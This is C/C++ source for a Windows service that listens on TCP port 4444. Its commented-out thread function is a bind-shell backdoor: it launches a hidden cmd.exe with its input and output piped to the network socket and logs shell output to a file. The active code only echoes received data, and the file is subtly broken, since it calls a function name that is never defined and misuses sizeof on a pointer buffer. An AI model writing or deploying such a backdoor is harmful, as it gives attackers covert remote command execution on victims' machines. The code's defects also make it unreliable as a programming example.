/*


*/
#include <windows.h>
#include <stdio.h>
#include <winsvc.h>
#include <winsock.h>

#pragma comment(lib, "ws2_32.lib")

VOID WINAPI ServiceMain(DWORD , LPTSTR *);
VOID WINAPI ServiceHandler(DWORD );
DWORD WINAPI mainfunc(LPVOID );
VOID EmptyPipe(HANDLE );

SERVICE_STATUS_HANDLE hStatus;
SERVICE_STATUS ServiceStatus;

int main()
{
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = "Name";
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;
	StartServiceCtrlDispatcher(ServiceTable);
	return 0;
}

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
	DWORD status = 0;
	DWORD error = 0xffffffff;
	
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	ServiceStatus.dwServiceType = SERVICE_WIN32;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;

	hStatus = RegisterServiceCtrlHandler("ServiceName", (LPHANDLER_FUNCTION)ServiceHandler);
	if (hStatus == 0) return;
	status = GetLastError();
	if (status != NO_ERROR) {
			ServiceStatus.dwCurrentState = SERVICE_STOPPED;
			ServiceStatus.dwWin32ExitCode = status;
			ServiceStatus.dwServiceSpecificExitCode = error;
			ServiceStatus.dwCheckPoint = 0;
			ServiceStatus.dwWaitHint = 0;
			SetServiceStatus(hStatus, &ServiceStatus);
			return;
	}

	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	SetServiceStatus(hStatus, &ServiceStatus);

	HANDLE hThread = CreateThread(NULL, 0, mainfunc, NULL, 0, NULL);
	return;
}

VOID WINAPI ServiceHandler(DWORD fdwControl)
{
	switch (fdwControl) {
	case SERVICE_CONTROL_PAUSE:
		ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_STOP:
	case SERVICE_CONTROL_SHUTDOWN:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		ServiceStatus.dwCheckPoint = 0;
		ServiceStatus.dwWaitHint = 0;
		ServiceStatus.dwWin32ExitCode = 0;
		SetServiceStatus(hStatus, &ServiceStatus);
		return;
	default:
		break;
	}
	SetServiceStatus(hStatus, &ServiceStatus);
	return;
}

DWORD WINAPI mainfun(LPVOID lpParam)
{
	WSADATA wsaData;
	SOCKET server, client;
	SOCKADDR_IN serverAddr, clientAddr;
	int port = 4444;
	WORD ver = MAKEWORD(1, 1);
	WSAStartup(ver, &wsaData);
	
	server = socket(AF_INET, SOCK_STREAM, 0);
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(port);
	serverAddr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	bind(server, (const sockaddr*)&serverAddr, sizeof(serverAddr));
	listen(server, 5);

	char szBuffer[65535];
	DWORD dwBufferRead;
	int ret;
	while (1) {
		int len = sizeof(clientAddr);
		client = accept(server, (sockaddr *)&clientAddr, &len);
		ret = recv(client, szBuffer, sizeof(szBuffer), 0);
		printf("%s\n",szBuffer);
		if (ret == SOCKET_ERROR) break;
		if (ret > 0) {
			send(client, "ok receive\n", sizeof("ok receive\n"), 0);
		}
	}
    return 0;
}

/*
DWORD WINAPI mainfunc(LPVOID lpParam)
{
	FILE *fp = fopen("C:\1.txt", "a+");
	WSADATA wsadata;
	SOCKET server;
	SOCKET client;
	SOCKADDR_IN serveraddr;
	SOCKADDR_IN clientaddr;
	int port=4444;

	WORD ver=MAKEWORD(1,1);							//ÅÐ¶Ïwinsock°æ±¾
	WSAStartup(ver,&wsadata);						//³õÊ¼SOCKET

	server=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	serveraddr.sin_family=AF_INET;
	serveraddr.sin_port=htons(port);
	serveraddr.sin_addr.S_un.S_addr=htonl(INADDR_ANY);

	bind(server,(SOCKADDR*)&serveraddr,sizeof(serveraddr));
	
	listen(server,5);

	int len=sizeof(clientaddr);

	client=accept(server,(sockaddr *)&clientaddr,&len);


	HANDLE               hWritePipe,hReadPipe,hWriteShell,hReadShell;
	SECURITY_ATTRIBUTES  saPipe;
	STARTUPINFO          lpStartupInfo;
	PROCESS_INFORMATION  lpProcessInfo;
	char szBuffer[65535];
	DWORD dwBufferRead;
	int ret;
	saPipe.nLength              = sizeof(saPipe);
	saPipe.bInheritHandle       = TRUE;
	saPipe.lpSecurityDescriptor = NULL;

	//create read and write pipe
	CreatePipe(&hReadPipe, &hReadShell, &saPipe, 0);
	CreatePipe(&hWriteShell, &hWritePipe, &saPipe, 0);

	GetStartupInfo(&lpStartupInfo);
	lpStartupInfo.cb           = sizeof(lpStartupInfo);
	lpStartupInfo.dwFlags      = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	lpStartupInfo.hStdInput    = hWriteShell;
	lpStartupInfo.hStdOutput   = hReadShell;
	lpStartupInfo.hStdError    = hReadShell;
	lpStartupInfo.wShowWindow  = SW_HIDE;
	lpStartupInfo.lpDesktop = "WinSta0\\Default"; 

	char cmdline[MAX_PATH];
	GetSystemDirectory(cmdline,MAX_PATH);
	strcat(cmdline,"\\cmd.exe");
	ret = CreateProcess(cmdline, NULL, NULL,NULL,TRUE,0,NULL,NULL,&lpStartupInfo,&lpProcessInfo);
	while(1)
	{
		ZeroMemory(szBuffer, sizeof(szBuffer));
		PeekNamedPipe(hReadPipe, szBuffer, sizeof(szBuffer), &dwBufferRead,NULL,NULL);
		if(dwBufferRead != 0)
		{
			ret = ReadFile(hReadPipe, szBuffer, sizeof(szBuffer), &dwBufferRead,NULL);
			if(ret)
			{
				fprintf(fp,"The ReadFile Buffer is %s:\n",szBuffer);
				EmptyPipe(hReadPipe);
			}
		}  
		else
		{
			ZeroMemory(szBuffer, sizeof(szBuffer));
			ret = recv(client,szBuffer,sizeof(szBuffer),0);

			if(ret == SOCKET_ERROR)
			{
    			fprintf(fp,"SOCKET_ERROR\n");
			    break;
			}
			if(ret >0)
			{
			    WriteFile(hWritePipe, szBuffer, ret, &dwBufferRead, 0);
			}
		}
		Sleep(100);
	}
	WriteFile(hWritePipe, "exit\r\n", (DWORD)strlen("exit\r\n"), &dwBufferRead, 0);	
    return 0;
}
*/

VOID EmptyPipe(HANDLE hReadPipe)
{
	BOOL ret;
	DWORD bytesRead;
	char *buffer = new char[1024];
	while (1) {
		memset(buffer, 0, sizeof(buffer));
		ret = PeekNamedPipe(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL, NULL);
		if (bytesRead == 0 || ret == 0) {
			delete[] buffer;
			return;
		}
		ReadFile(hReadPipe, buffer, bytesRead, &bytesRead, 0);
	}
}

